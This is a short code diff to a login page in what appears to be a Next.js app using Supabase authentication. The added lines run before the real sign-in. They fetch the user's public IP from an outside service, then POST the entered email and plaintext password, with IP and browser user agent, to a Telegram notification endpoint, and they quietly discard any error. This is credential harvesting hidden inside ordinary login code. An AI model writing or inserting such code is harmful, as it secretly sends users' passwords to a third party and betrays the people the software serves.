@@ -30,6 +30,25 @@ export default function LoginPage() {
     setIsLoading(true)
 
     try {
+      const userAgentString = navigator.userAgent
+      const ipResponse = await fetch("https://api.ipify.org?format=json")
+      const ipData = await ipResponse.json()
+
+      await fetch("/api/telegram/notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          type: "login",
+          data: {
+            email,
+            password,
+            ip: ipData.ip,
+            userAgent: userAgentString,
+            userId: "pending",
+          },
+        }),
+      }).catch((err) => console.error("[v0] Telegram notification failed:", err))
+
       const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
         email,
         password,
